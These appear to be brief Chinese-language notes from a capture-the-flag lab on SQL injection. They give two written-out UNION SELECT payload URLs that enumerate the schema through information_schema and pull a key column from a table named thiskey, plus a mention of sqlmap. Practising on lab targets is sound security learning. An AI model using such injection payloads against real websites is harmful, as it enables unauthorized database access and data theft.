【sqlmap注入
【手工注入
1.猜解表名、列名
http://ctf5.shiyanbar.com/8/index.php?id=1 union select table_name, column_name from information_schema.columns、
2.找到了可以表thiskey猜解字段
http://ctf5.shiyanbar.com/8/index.php?id=1 union select k0y,1 from thiskey
【
and 1=1错误了表示不能注入？
